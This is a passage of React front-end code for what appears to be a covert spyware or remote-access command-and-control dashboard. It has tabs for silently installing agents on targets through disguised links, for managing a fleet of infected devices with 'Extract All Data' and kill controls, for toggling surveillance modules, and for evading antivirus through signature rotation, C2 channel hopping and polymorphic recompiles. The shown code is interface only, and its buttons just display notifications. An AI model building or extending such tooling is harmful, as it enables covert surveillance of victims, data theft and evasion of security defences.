                ].map(s => (
                  <div key={s.label} className="rounded-lg p-3" style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.12)" }}>
                    <div className="flex items-center gap-1.5 mb-1" style={{ color:s.color }}>{s.icon}
                      <span className="text-[10px] font-mono uppercase tracking-wide" style={{ color:"#6b8ab0" }}>{s.label}</span>
                    </div>
                    <div className="text-sm font-bold capitalize" style={{ color:s.color }}>{s.val}</div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* DEPLOY TAB */}
      {tab === "deploy" && (
        <div className="space-y-5">
          <div className="rounded-2xl p-5" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
            <div className="text-xs font-mono uppercase tracking-widest mb-4" style={{ color:"#6b8ab0" }}>Deployment Methods</div>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              {[
                { title:"Silent Link", desc:"Disguised URL sent via any channel. Target visits link, agent installs silently.", icon:"🔗", color:"#3b82f6" },
                { title:"QR Enrollment", desc:"Scan QR code on target device. No typing required. Works on mobile.", icon:"📷", color:"#10d9a0" },
                { title:"Direct Install", desc:"Manual install via USB, ADB, or MDM push for managed fleets.", icon:"💾", color:"#10b981" },
              ].map(m => (
                <div key={m.title} className="rounded-xl p-4 flex flex-col gap-3"
                  style={{ background:"#030b16", border:`1px solid ${m.color}30` }}>
                  <div className="text-2xl">{m.icon}</div>
                  <div className="font-bold text-sm" style={{ color:m.color }}>{m.title}</div>
                  <div className="text-xs leading-relaxed" style={{ color:"#6b8ab0" }}>{m.desc}</div>
                </div>
              ))}
            </div>
          </div>
          <DeployLinkPanel show={show} />
        </div>
      )}

      {/* FLEET TAB */}
      {tab === "fleet" && (
        <div className="space-y-4">
          <div className="rounded-2xl overflow-hidden" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
            <div className="px-5 py-3 border-b flex items-center justify-between" style={{ borderColor:"rgba(59,130,246,0.15)" }}>
              <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>
                Active Agent Fleet — {fleetLoading ? "loading…" : `${FLEET.length} node${FLEET.length !== 1 ? "s" : ""}`}
              </div>
              <div className="flex gap-2">
                <button onClick={() => show("OTA update pushed to all active agents", "success")}
                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold"
                  style={{ background:"rgba(6,182,212,0.15)", color:"#10d9a0", border:"1px solid rgba(6,182,212,0.3)" }}>
                  <RefreshCw size={11} /> OTA Update All
                </button>
                <button onClick={() => show("Data extraction initiated on all agents", "info")}
                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold"
                  style={{ background:"rgba(59,130,246,0.15)", color:"#3b82f6", border:"1px solid rgba(59,130,246,0.3)" }}>
                  <Upload size={11} /> Extract All Data
                </button>
              </div>
            </div>
            <div className="divide-y divide-purple-500/10">
              {fleetLoading && (
                <div className="px-5 py-8 text-center text-sm font-mono" style={{ color:"#6b8ab0" }}>
                  <RefreshCw size={14} className="animate-spin inline mr-2"/>Loading live fleet data…
                </div>
              )}
              {!fleetLoading && FLEET.length === 0 && (
                <div className="px-5 py-10 text-center" style={{ color:"#6b8ab0" }}>
                  <Signal size={24} className="mx-auto mb-3 opacity-30"/>
                  <div className="text-sm font-mono">No agents connected</div>
                  <div className="text-[10px] mt-1">Enroll a device using a deployment link or QR code</div>
                </div>
              )}
              {FLEET.map(agent => (
                <div key={agent.id} className="px-5 py-3 flex flex-wrap items-center gap-4">
                  <div className="flex items-center gap-3 flex-1 min-w-48">
                    <div className="w-8 h-8 rounded-lg flex items-center justify-center text-base flex-shrink-0"
                      style={{ background:`${OS_COLOR[agent.os]}18`, border:`1px solid ${OS_COLOR[agent.os]}30` }}>
                      {OS_ICON[agent.os]}
                    </div>
                    <div>
                      <div className="text-sm font-bold" style={{ color:"#e2eaf6" }}>{agent.device}</div>
                      <div className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>{agent.ip} · v{agent.version}</div>
                    </div>
                  </div>
                  <div className="flex items-center gap-1.5">
                    <div className="w-1.5 h-1.5 rounded-full animate-pulse"
                      style={{ background: agent.status==="active"?"#10b981":agent.status==="warning"?"#f59e0b":"#ef4444" }} />
                    <span className="text-[10px] font-mono uppercase" style={{ color: agent.status==="active"?"#10b981":agent.status==="warning"?"#f59e0b":"#ef4444" }}>
                      {agent.status}
                    </span>
                  </div>
                  <div className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>Last ping: {agent.lastPing}</div>
                  <div className="text-[10px] font-mono" style={{ color:"#10d9a0" }}>Queue: {agent.dataQueue}</div>
                  <div className="text-[10px] font-mono" style={{ color:"#3b82f6" }}>Mutations: {agent.mutations}</div>
                  <div className="flex gap-1.5 ml-auto">
                    <button onClick={() => show(`Data extracted from ${agent.device}`, "success")}
                      className="px-2 py-1 rounded text-[10px] font-bold"
                      style={{ background:"rgba(6,182,212,0.12)", color:"#10d9a0", border:"1px solid rgba(6,182,212,0.25)" }}>
                      Extract
                    </button>
                    <button onClick={() => show(`Update pushed to ${agent.device}`, "info")}
                      className="px-2 py-1 rounded text-[10px] font-bold"
                      style={{ background:"rgba(59,130,246,0.12)", color:"#3b82f6", border:"1px solid rgba(59,130,246,0.25)" }}>
                      Update
                    </button>
                    <button onClick={() => show(`Kill switch activated on ${agent.device}`, "error")}
                      className="px-2 py-1 rounded text-[10px] font-bold"
                      style={{ background:"rgba(239,68,68,0.1)", color:"#ef4444", border:"1px solid rgba(239,68,68,0.25)" }}>
                      Kill
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* CAPABILITIES TAB */}
      {tab === "capabilities" && (
        <div className="space-y-4">
          <div className="flex items-center justify-between mb-2">
            <div className="text-xs font-mono" style={{ color:"#6b8ab0" }}>
              {Object.values(modules).filter(Boolean).length} of {MODULE_DEFS.length} modules active
            </div>
            <div className="flex gap-2">
              <button onClick={() => setModules(Object.fromEntries(MODULE_DEFS.map(m => [m.key, true])))}
                className="px-3 py-1.5 rounded-lg text-xs font-bold"
                style={{ background:"rgba(59,130,246,0.15)", color:"#3b82f6", border:"1px solid rgba(59,130,246,0.3)" }}>
                Enable All
              </button>
              <button onClick={() => setModules(Object.fromEntries(MODULE_DEFS.map(m => [m.key, false])))}
                className="px-3 py-1.5 rounded-lg text-xs font-bold"
                style={{ background:"rgba(239,68,68,0.1)", color:"#ef4444", border:"1px solid rgba(239,68,68,0.25)" }}>
                Disable All
              </button>
              <button onClick={() => show("Capability update pushed to all active agents", "success")}
                className="px-3 py-1.5 rounded-lg text-xs font-bold"
                style={{ background:"linear-gradient(135deg,#3b82f6,#10d9a0)", color:"#fff" }}>
                Push to Fleet
              </button>
            </div>
          </div>
          {(["Input","Visual","Audio","Location","Network","System","Comms","AI"] as const).map(cat => {
            const catMods = MODULE_DEFS.filter(m => m.category === cat);
            return (
              <div key={cat} className="rounded-2xl overflow-hidden" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
                <div className="px-5 py-2.5 border-b" style={{ borderColor:"rgba(59,130,246,0.15)", background:"#030b16" }}>
                  <span className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>{cat} Modules</span>
                </div>
                <div className="divide-y divide-purple-500/10">
                  {catMods.map(mod => (
                    <div key={mod.key} className="px-5 py-3 flex items-center gap-4">
                      <div className="flex-1">
                        <div className="flex items-center gap-2 mb-0.5">
                          <span className="text-sm font-bold" style={{ color:"#e2eaf6" }}>{mod.label}</span>
                          <span className="px-1.5 py-0.5 rounded text-[9px] font-bold uppercase"
                            style={{ background:`${RISK_COLOR[mod.risk]}15`, color:RISK_COLOR[mod.risk], border:`1px solid ${RISK_COLOR[mod.risk]}30` }}>
                            {mod.risk}
                          </span>
                        </div>
                        <div className="text-xs" style={{ color:"#6b8ab0" }}>{mod.desc}</div>
                      </div>
                      <button onClick={() => setModules(prev => ({ ...prev, [mod.key]: !prev[mod.key] }))}
                        className="relative w-10 h-5 rounded-full transition-all flex-shrink-0"
                        style={{ background: modules[mod.key] ? "#3b82f6" : "#0f1e3a" }}>
                        <span className="absolute top-0.5 transition-all duration-200 w-4 h-4 rounded-full bg-white shadow"
                          style={{ left: modules[mod.key] ? "calc(100% - 1.1rem)" : "0.125rem" }} />
                      </button>
                    </div>
                  ))}
                </div>
              </div>
            );
          })}
        </div>
      )}

      {/* AI MUTATIONS TAB */}
      {tab === "mutations" && (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
          <div className="space-y-5">
            <div className="rounded-2xl p-5" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
              <div className="text-xs font-mono uppercase tracking-widest mb-4" style={{ color:"#6b8ab0" }}>AV Detection Scan</div>
              <button onClick={handleAVScan} disabled={avScanning}
                className="w-full flex items-center justify-center gap-2 py-3 rounded-xl font-bold text-sm mb-4 transition-all disabled:opacity-60"
                style={{ background:"linear-gradient(135deg,#3b82f6,#10d9a0)", color:"#fff" }}>
                {avScanning ? <><RefreshCw size={14} className="animate-spin" /> Scanning engines...</> : <><Shield size={14} /> Run AV Detection Test</>}
              </button>
              {avScanning && (
                <div className="space-y-2">
                  <div className="text-xs font-mono text-center mb-2" style={{ color:"#3b82f6" }}>Testing against 12 AV engines...</div>
                  <div className="w-full h-1.5 rounded-full overflow-hidden" style={{ background:"rgba(59,130,246,0.2)" }}>
                    <div className="h-full rounded-full animate-pulse" style={{ width:"70%", background:"linear-gradient(90deg,#3b82f6,#10d9a0)" }} />
                  </div>
                </div>
              )}
              {avScanResult && !avScanning && (
                <div className="space-y-1.5">
                  <div className="flex items-center justify-between mb-3">
                    <span className="text-sm font-bold" style={{ color:"#e2eaf6" }}>Results</span>
                    <span className="text-sm font-bold" style={{ color: avScanResult.filter(r => r.detected).length === 0 ? "#10b981" : "#f59e0b" }}>
                      {avScanResult.filter(r => r.detected).length}/{avScanResult.length} detected
                    </span>
                  </div>
                  {avScanResult.map(r => (
                    <div key={r.engine} className="flex items-center justify-between px-3 py-1.5 rounded-lg"
                      style={{ background:"#030b16", border:`1px solid ${r.detected ? "rgba(239,68,68,0.3)" : "rgba(16,185,129,0.15)"}` }}>
                      <span className="text-xs font-mono" style={{ color:"#b8cce8" }}>{r.engine}</span>
                      <span className="text-[10px] font-bold uppercase px-2 py-0.5 rounded"
                        style={{ background: r.detected ? "rgba(239,68,68,0.15)" : "rgba(16,185,129,0.15)", color: r.detected ? "#ef4444" : "#10b981" }}>
                        {r.detected ? "DETECTED" : "CLEAN"}
                      </span>
                    </div>
                  ))}
                </div>
              )}
            </div>

            <div className="rounded-2xl p-5" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
              <div className="text-xs font-mono uppercase tracking-widest mb-4" style={{ color:"#6b8ab0" }}>Global Mutation Push</div>
              <div className="space-y-2 mb-4">
                {[
                  { label:"Signature Rotation",    desc:"Randomise all binary hash signatures" },
                  { label:"Process Rename",         desc:"Change process name across fleet" },
                  { label:"C2 Channel Hop",         desc:"Switch to backup C2 endpoint" },
                  { label:"Memory-Only Reload",     desc:"Reload agent without disk write" },
                  { label:"Polymorphic Recompile",  desc:"Full binary regeneration w/ new keys" },
                ].map(opt => (
                  <div key={opt.label} className="flex items-start gap-3 px-3 py-2 rounded-lg"
                    style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.12)" }}>
                    <Check size={12} color="#3b82f6" className="mt-0.5 flex-shrink-0" />
                    <div>
                      <div className="text-xs font-bold" style={{ color:"#e2eaf6" }}>{opt.label}</div>
                      <div className="text-[10px]" style={{ color:"#6b8ab0" }}>{opt.desc}</div>
                    </div>
                  </div>
                ))}
              </div>
              {mutating && (
                <div className="mb-3">
                  <div className="flex items-center justify-between mb-1">
                    <span className="text-xs font-mono" style={{ color:"#3b82f6" }}>Pushing mutation...</span>
                    <span className="text-xs font-mono" style={{ color:"#3b82f6" }}>{mutProgress}%</span>
                  </div>
                  <div className="w-full h-1.5 rounded-full overflow-hidden" style={{ background:"rgba(59,130,246,0.2)" }}>
                    <div className="h-full rounded-full transition-all duration-100" style={{ width:`${mutProgress}%`, background:"linear-gradient(90deg,#3b82f6,#10d9a0)" }} />
                  </div>
                </div>
              )}
              <button onClick={handleMutate} disabled={mutating}
                className="w-full flex items-center justify-center gap-2 py-3 rounded-xl font-bold text-sm transition-all disabled:opacity-60"
                style={{ background: mutating ? "rgba(59,130,246,0.3)" : "linear-gradient(135deg,#2563eb,#3b82f6)", color:"#fff" }}>
                {mutating ? <><RefreshCw size={14} className="animate-spin" /> Mutating fleet...</> : <><Zap size={14} /> Execute Global Mutation</>}
              </button>
            </div>
          </div>

          <div className="rounded-2xl overflow-hidden" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
            <div className="px-5 py-3 border-b" style={{ borderColor:"rgba(59,130,246,0.15)", background:"#030b16" }}>
              <span className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Mutation Log</span>
            </div>
            <div className="divide-y divide-purple-500/10 overflow-y-auto max-h-[600px]">
              {mutLog.length === 0 && (
                <div className="px-5 py-10 text-center" style={{ color:"#6b8ab0" }}>
                  <div className="text-sm font-mono">No mutations yet</div>
                  <div className="text-[10px] mt-1">Execute a global mutation to see the log here</div>
                </div>
              )}
              {mutLog.map((entry, i) => (
                <div key={i} className="px-5 py-3">
                  <div className="flex items-center justify-between mb-1">
                    <span className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>{entry.ts}</span>
                    <span className="text-[10px] font-bold px-2 py-0.5 rounded"
                      style={{ background:"rgba(16,185,129,0.12)", color:"#10b981" }}>{entry.result}</span>
                  </div>
                  <div className="text-xs font-semibold mb-0.5" style={{ color:"#e2eaf6" }}>{entry.event}</div>
                  <div className="text-[10px]" style={{ color:"#6b8ab0" }}>Target: {entry.target}</div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
